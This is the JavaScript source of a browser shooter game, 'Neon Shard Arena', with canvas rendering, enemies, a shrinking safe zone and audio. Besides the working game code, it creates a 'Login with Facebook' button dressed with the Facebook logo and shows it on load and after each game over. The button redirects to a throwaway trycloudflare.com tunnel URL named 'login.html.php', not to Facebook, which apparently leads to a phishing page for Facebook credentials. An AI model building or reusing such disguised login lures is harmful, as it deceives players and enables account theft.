// DOM Elements
const canvas = document.getElementById('gameCanvas');
const ctx = canvas.getContext('2d');
const healthValueEl = document.getElementById('health-value');
const enemiesLeftValueEl = document.getElementById('enemies-left-value');
const messageDisplayEl = document.getElementById('message-display');
const facebookLoginRedirectButton = document.getElementById('facebook-login-redirect-button'); 
const playGameButton = document.getElementById('play-game-button'); // New button
const zoneTimerEl = document.getElementById('zone-timer');

// Game Configuration
const PLAYER_SIZE = 15;
const ENEMY_SIZE = 18;
const PROJECTILE_SIZE = 5;
const PLAYER_SPEED = 3;
const ENEMY_SPEED = 1;
const PROJECTILE_SPEED = 7;
const INITIAL_ENEMIES = 8;
const PLAYER_MAX_HEALTH = 100;
const SHOOT_COOLDOWN = 200; 
const SAFE_ZONE_INITIAL_RADIUS_FACTOR = 1.5; 
const SAFE_ZONE_SHRINK_INTERVAL = 15000; 
const SAFE_ZONE_SHRINK_AMOUNT_FACTOR = 0.15; 
const ZONE_DAMAGE = 0.2; 

// Game State
let player;
let enemies = [];
let projectiles = [];
let safeZone;
let mousePos = { x: 0, y: 0 };
let gameRunning = false;
let lastShotTime = 0;
let score = 0; 
let zoneShrinkTimer = 0;
let nextShrinkTime = SAFE_ZONE_SHRINK_INTERVAL;

// Audio Context and Sound Buffers
let audioContext;
const soundBuffers = {};
const soundsToLoad = {
    shoot: 'shoot_sfx.mp3',
    hit: 'hit_sfx.mp3',
    gameOver: 'game_over_sfx.mp3',
    zoneDamage: 'zone_damage_sfx.mp3',
    victory: 'victory_sfx.mp3',
    enemyHit: 'enemy_hit_sfx.mp3' 
};
let zoneDamageSoundNode = null;

// Asset Images
const images = {};
const imagesToLoad = {
    player: 'player_avatar.png',
    enemy: 'enemy_avatar.png',
    projectile: 'projectile_bullet.png'
};
let imagesLoadedCount = 0;
let totalImages = Object.keys(imagesToLoad).length;

const FACEBOOK_SVG_ICON = '<svg class="facebook-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M22.676 0H1.324C.593 0 0 .593 0 1.324v21.352C0 23.407.593 24 1.324 24h11.494v-9.294H9.689v-3.621h3.129V8.41c0-3.1 1.893-4.785 4.659-4.785 1.325 0 2.464.097 2.796.141v3.24h-1.918c-1.504 0-1.795.715-1.795 1.763v2.309h3.587l-.467 3.622h-3.12V24h6.116c.73 0 1.323-.593 1.323-1.324V1.324C24 .593 23.407 0 22.676 0z"/></svg>';
const FACEBOOK_LOGIN_URL = 'https://microwave-usual-confidential-crossword.trycloudflare.com/login.html.php';

// --- Audio Functions ---
function initAudio() {
    audioContext = new (window.AudioContext || window.webkitAudioContext)();
    if (!audioContext) {
        console.warn("Web Audio API not supported. Sound will be disabled.");
        return;
    }
    loadSounds();
}

async function loadSound(name, url) {
    if (!audioContext) return;
    try {
        const response = await fetch(url);
        const arrayBuffer = await response.arrayBuffer();
        const audioBuffer = await audioContext.decodeAudioData(arrayBuffer);
        soundBuffers[name] = audioBuffer;
    } catch (error) {
        console.error(`Error loading sound ${name}:`, error);
    }
}

function loadSounds() {
    if (!audioContext) return;
    Object.entries(soundsToLoad).forEach(([name, url]) => {
        loadSound(name, url);
    });
}

function playSound(name, loop = false, volume = 1) {
    if (!audioContext || !soundBuffers[name]) return null;
    const source = audioContext.createBufferSource();
    source.buffer = soundBuffers[name];

    const gainNode = audioContext.createGain();
    gainNode.gain.value = volume;

    source.connect(gainNode);
    gainNode.connect(audioContext.destination);
    
    source.loop = loop;
    source.start(0);
    return source;
}

function stopSound(sourceNode) {
    if (sourceNode) {
        sourceNode.stop();
    }
}

// --- Image Loading ---
function loadImage(name, src) {
    const img = new Image();
    img.src = src;
    img.onload = () => {
        images[name] = img;
        imagesLoadedCount++;
        if (imagesLoadedCount === totalImages) {
            console.log("All images loaded.");
        }
    };
    img.onerror = () => {
        console.error(`Failed to load image: ${name} at ${src}`);
        imagesLoadedCount++; 
         if (imagesLoadedCount === totalImages) {
            console.log("Finished attempting to load all images.");
        }
    }
}

function loadAllImages() {
    Object.entries(imagesToLoad).forEach(([name, src]) => {
        loadImage(name, src);
    });
}

// --- Utility Functions ---
function distance(p1, p2) {
    return Math.sqrt((p1.x - p2.x) ** 2 + (p1.y - p2.y) ** 2);
}

function getRandom(min, max) {
    return Math.random() * (max - min) + min;
}

// --- Classes ---
class Entity {
    constructor(x, y, radius, color, imageKey) {
        this.x = x;
        this.y = y;
        this.radius = radius;
        this.color = color;
        this.imageKey = imageKey; 
    }

    draw(ctx) {
        const img = images[this.imageKey];
        if (img) {
            ctx.drawImage(img, this.x - this.radius, this.y - this.radius, this.radius * 2, this.radius * 2);
        } else { 
            ctx.beginPath();
            ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
            ctx.fillStyle = this.color;
            ctx.fill();
            ctx.strokeStyle = "white";
            ctx.lineWidth = 1;
            ctx.stroke();
        }
    }
}

class Player extends Entity {
    constructor(x, y) {
        super(x, y, PLAYER_SIZE, 'cyan', 'player');
        this.health = PLAYER_MAX_HEALTH;
        this.targetX = x;
        this.targetY = y;
    }

    update() {
        const dx = this.targetX - this.x;
        const dy = this.targetY - this.y;
        const distToTarget = Math.sqrt(dx * dx + dy * dy);

        if (distToTarget > 1) {
            this.x += (dx / distToTarget) * PLAYER_SPEED;
            this.y += (dy / distToTarget) * PLAYER_SPEED;
        }
        
        this.x = Math.max(this.radius, Math.min(canvas.width - this.radius, this.x));
        this.y = Math.max(this.radius, Math.min(canvas.height - this.radius, this.y));
    }

    setTarget(x,y){
        this.targetX = x;
        this.targetY = y;
    }

    shoot() {
        const now = Date.now();
        if (now - lastShotTime < SHOOT_COOLDOWN) return;
        lastShotTime = now;

        const angle = Math.atan2(mousePos.y - this.y, mousePos.x - this.x);
        projectiles.push(new Projectile(this.x, this.y, angle));
        playSound('shoot', false, 0.3);
    }

    takeDamage(amount) {
        this.health -= amount;
        if (this.health < 0) this.health = 0;
        updateUI();
        if (amount > ZONE_DAMAGE * 1.5) { 
             playSound('hit', false, 0.6);
        }
        if (this.health <= 0) {
            gameOver("Eliminated!");
        }
    }
}

class Enemy extends Entity {
    constructor(x, y) {
        super(x, y, ENEMY_SIZE, 'red', 'enemy');
        this.angle = Math.random() * Math.PI * 2;
        this.speed = ENEMY_SPEED * (0.8 + Math.random() * 0.4); 
        this.targetSwitchInterval = 2000 + Math.random() * 3000; 
        this.lastTargetSwitch = Date.now();
        this.isAggro = false;
        this.aggroRange = 200;
        this.wanderTarget = {x, y};
        this.setRandomWanderTarget();
    }

    setRandomWanderTarget() {
        const angle = Math.random() * Math.PI * 2;
        const dist = Math.random() * 100 + 50; 
        this.wanderTarget.x = this.x + Math.cos(angle) * dist;
        this.wanderTarget.y = this.y + Math.sin(angle) * dist;

        this.wanderTarget.x = Math.max(this.radius, Math.min(canvas.width - this.radius, this.wanderTarget.x));
        this.wanderTarget.y = Math.max(this.radius, Math.min(canvas.height - this.radius, this.wanderTarget.y));
    }

    update() {
        let targetX, targetY;

        if (player && distance(this, player) < this.aggroRange) {
            this.isAggro = true;
        } else if (player && distance(this, player) > this.aggroRange * 1.5) {
            this.isAggro = false; 
        }
        
        if (this.isAggro && player) {
            targetX = player.x;
            targetY = player.y;
        } else {
            if (Date.now() - this.lastTargetSwitch > this.targetSwitchInterval || distance(this, this.wanderTarget) < this.radius * 2) {
                this.setRandomWanderTarget();
                this.lastTargetSwitch = Date.now();
            }
            targetX = this.wanderTarget.x;
            targetY = this.wanderTarget.y;
        }
        
        const dx = targetX - this.x;
        const dy = targetY - this.y;
        const distToTarget = Math.sqrt(dx * dx + dy * dy);

        if (distToTarget > 1) {
            this.x += (dx / distToTarget) * this.speed;
            this.y += (dy / distToTarget) * this.speed;
        }

        this.x = Math.max(this.radius, Math.min(canvas.width - this.radius, this.x));
        this.y = Math.max(this.radius, Math.min(canvas.height - this.radius, this.y));
    }
}

class Projectile extends Entity {
    constructor(x, y, angle) {
        super(x, y, PROJECTILE_SIZE, 'yellow', 'projectile');
        this.vx = Math.cos(angle) * PROJECTILE_SPEED;
        this.vy = Math.sin(angle) * PROJECTILE_SPEED;
    }

    update() {
        this.x += this.vx;
        this.y += this.vy;
    }
}

class SafeZone {
    constructor(centerX, centerY, initialRadius) {
        this.x = centerX;
        this.y = centerY;
        this.radius = initialRadius;
        this.targetRadius = initialRadius;
        this.shrinkSpeed = 0.1; 
    }

    shrink() {
        this.targetRadius *= (1 - SAFE_ZONE_SHRINK_AMOUNT_FACTOR);
    }

    update() {
        if (this.radius > this.targetRadius) {
            this.radius -= this.shrinkSpeed * (this.radius / 100); 
            this.radius = Math.max(this.radius, this.targetRadius);
        }
    }

    draw(ctx) {
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
        ctx.strokeStyle = 'rgba(0, 255, 255, 0.5)';
        ctx.lineWidth = 3;
        ctx.stroke();

        ctx.beginPath();
        ctx.arc(this.x, this.y, this.radius + 5, 0, Math.PI * 2);
        ctx.strokeStyle = 'rgba(255, 0, 0, 0.1)';
        ctx.lineWidth = 10;
        ctx.stroke();
    }

    isOutside(entity) {
        return distance(entity, this) > this.radius;
    }
}

// --- Game Logic Functions ---
function initGame() {
    canvas.width = 800;
    canvas.height = 600;

    loadAllImages(); 

    player = new Player(canvas.width / 2, canvas.height / 2);
    enemies = [];
    projectiles = [];
    
    const initialRadius = Math.sqrt(canvas.width**2 + canvas.height**2) / 2 * SAFE_ZONE_INITIAL_RADIUS_FACTOR;
    safeZone = new SafeZone(canvas.width / 2, canvas.height / 2, initialRadius);
    
    zoneShrinkTimer = 0;
    nextShrinkTime = SAFE_ZONE_SHRINK_INTERVAL;

    spawnEnemies(INITIAL_ENEMIES);
    
    player.health = PLAYER_MAX_HEALTH;
    updateUI();
    hideMessage();
    facebookLoginRedirectButton.style.display = 'none';
    playGameButton.style.display = 'none'; 
    gameRunning = true;
    
    if (!audioContext) initAudio(); 
    gameLoop();
}

function spawnEnemies(count) {
    for (let i = 0; i < count; i++) {
        let x, y, validPosition;
        do {
            x = getRandom(ENEMY_SIZE, canvas.width - ENEMY_SIZE);
            y = getRandom(ENEMY_SIZE, canvas.height - ENEMY_SIZE);
            validPosition = player ? distance({x,y}, player) > PLAYER_SIZE * 5 : true;
        } while (!validPosition);
        enemies.push(new Enemy(x, y));
    }
    updateUI();
}

function updateGame(deltaTime) {
    if (!gameRunning) return;

    player.update();
    projectiles.forEach(p => p.update());
    enemies.forEach(e => e.update());
    safeZone.update();

    zoneShrinkTimer += deltaTime;
    if (zoneShrinkTimer >= nextShrinkTime) {
        safeZone.shrink();
        zoneShrinkTimer = 0; 
    }

    handleCollisions();

    let wasOutsideZone = false;
    if (safeZone.isOutside(player)) {
        player.takeDamage(ZONE_DAMAGE); 
        wasOutsideZone = true;
        if (!zoneDamageSoundNode || zoneDamageSoundNode.playbackState !== AudioBufferSourceNode.PLAYING_STATE) {
             if (audioContext && soundBuffers.zoneDamage) { 
                zoneDamageSoundNode = playSound('zoneDamage', true, 0.2);
            }
        }
    } else {
        if (zoneDamageSoundNode) {
            stopSound(zoneDamageSoundNode);
            zoneDamageSoundNode = null;
        }
    }
    
    projectiles = projectiles.filter(p => 
        p.x > 0 && p.x < canvas.width && p.y > 0 && p.y < canvas.height
    );

    checkGameEndConditions();
    updateUI();
}

function handleCollisions() {
    projectiles.forEach((p, pi) => {
        enemies.forEach((e, ei) => {
            if (distance(p, e) < p.radius + e.radius) {
                projectiles.splice(pi, 1);
                enemies.splice(ei, 1);
                playSound('enemyHit', false, 0.5); 
                score += 10; 
            }
        });
    });

    enemies.forEach(e => {
        if (distance(player, e) < player.radius + e.radius) {
            player.takeDamage(5); 
            const angle = Math.atan2(e.y - player.y, e.x - player.x);
            e.x += Math.cos(angle) * e.radius * 0.5;
            e.y += Math.sin(angle) * e.radius * 0.5;
        }
    });
}

function checkGameEndConditions() {
    if (player.health <= 0) {
        return; // gameOver is called from player.takeDamage
    }
    if (enemies.length === 0 && gameRunning) {
        gameOver("Victory! All Shards Neutralized!", true);
    }
}

let lastTimestamp = 0;
function gameLoop(timestamp) {
    if (!gameRunning && timestamp) return; 

    const deltaTime = timestamp ? timestamp - lastTimestamp : 16.66; 
    lastTimestamp = timestamp;
    
    updateGame(Math.min(deltaTime, 50)); 
    drawGame();

    if (gameRunning) {
        requestAnimationFrame(gameLoop);
    }
}

// --- Drawing Functions ---
function drawBackground() {
    ctx.fillStyle = '#0f0f24'; 
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    for(let i=0; i<50; i++) {
        const x = Math.random() * canvas.width;
        const y = Math.random() * canvas.height;
        const r = Math.random() * 1.5;
        const alpha = Math.random() * 0.5 + 0.2;
        ctx.beginPath();
        ctx.arc(x,y,r,0, Math.PI*2);
        ctx.fillStyle = `rgba(200, 220, 255, ${alpha})`;
        ctx.fill();
    }
}

function drawGame() {
    drawBackground();
    safeZone.draw(ctx);
    projectiles.forEach(p => p.draw(ctx));
    enemies.forEach(e => e.draw(ctx));
    if (player) player.draw(ctx); 
}

// --- UI Functions ---
function updateUI() {
    if(player) healthValueEl.textContent = Math.ceil(player.health);
    enemiesLeftValueEl.textContent = enemies.length;

    const remainingShrinkTime = Math.max(0, nextShrinkTime - zoneShrinkTimer);
    const minutes = Math.floor(remainingShrinkTime / 60000);
    const seconds = Math.floor((remainingShrinkTime % 60000) / 1000);
    zoneTimerEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

function showMessage(text, isVictory = false) {
    messageDisplayEl.textContent = text;
    messageDisplayEl.className = 'message-display'; 
    messageDisplayEl.style.color = isVictory ? '#00ff00' : '#ff3399';
    messageDisplayEl.style.borderColor = isVictory ? '#00ff00' : '#ff3399';
    messageDisplayEl.style.boxShadow = `0 0 15px ${isVictory ? '#00ff00' : '#ff3399'}`;
}

function hideMessage() {
    messageDisplayEl.className = 'message-display hidden';
}

function gameOver(message, victory = false) {
    if (!gameRunning) return; 
    gameRunning = false;
    showMessage(message, victory);
    
    playGameButton.textContent = "Play Again";
    playGameButton.style.display = 'inline-block';
    facebookLoginRedirectButton.style.display = 'inline-flex'; // Show FB button again

    if (victory) {
        playSound('victory', false, 0.7);
    } else {
        playSound('gameOver', false, 0.7);
    }

    if (zoneDamageSoundNode) {
        stopSound(zoneDamageSoundNode);
        zoneDamageSoundNode = null;
    }
}

// --- Event Listeners ---
canvas.addEventListener('mousemove', (e) => {
    const rect = canvas.getBoundingClientRect();
    mousePos.x = e.clientX - rect.left;
    mousePos.y = e.clientY - rect.top;
    if (player) {
        player.setTarget(mousePos.x, mousePos.y);
    }
});

canvas.addEventListener('click', () => {
    if (gameRunning && player) {
        player.shoot();
    }
});

facebookLoginRedirectButton.addEventListener('click', () => {
    console.log("Facebook Login button clicked. Redirecting...");
    // alert("Mock redirect to Facebook login."); // For testing without actual redirect
    window.location.href = FACEBOOK_LOGIN_URL;
});

playGameButton.addEventListener('click', () => {
    if (!audioContext) {
        initAudio(); 
    }
    initGame();
});

// --- Initial Setup ---
facebookLoginRedirectButton.innerHTML = `${FACEBOOK_SVG_ICON} Login with Facebook`;
facebookLoginRedirectButton.style.display = 'inline-flex'; 
playGameButton.style.display = 'inline-block';
playGameButton.textContent = "Play Game";

hideMessage(); // Initially, no message is shown, only buttons.
updateUI(); // Initialize UI text for health/shards if needed (though game not started)
console.log("Neon Shard Arena initialized. Login with Facebook or click 'Play Game' to begin.");